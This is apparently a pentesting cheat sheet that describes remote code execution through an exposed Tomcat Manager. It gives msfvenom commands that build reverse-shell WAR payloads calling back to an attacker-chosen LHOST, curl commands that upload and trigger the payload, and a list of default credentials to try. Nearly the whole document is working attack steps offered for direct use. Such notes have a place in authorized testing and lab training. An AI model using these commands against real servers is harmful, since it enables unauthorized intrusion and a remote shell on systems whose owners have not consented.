# Tomcat Manager WAR Deploy RCE

When Tomcat Manager (`/manager/html` or `/manager/text`) is accessible with valid credentials (default: `tomcat:tomcat`, `admin:admin`, `manager:manager`):

**Generate reverse shell WAR:**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
# or for a Windows target:
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
```

**Find the JSP entry point inside the WAR:**
```bash
jar tf shell.war   # lists contents — note the .jsp filename
```

**Upload and trigger:**
```bash
# via Manager UI: "WAR file to deploy" → choose file → deploy
# via curl (text interface):
curl -u tomcat:tomcat http://<TARGET>:8080/manager/text/deploy?path=/shell \
  --upload-file shell.war
# trigger:
curl http://<TARGET>:8080/shell/<jsp_name>.jsp
```

**Default credential list worth trying:** `tomcat:tomcat`, `admin:admin`, `admin:s3cret`, `manager:manager`, `role1:role1`.
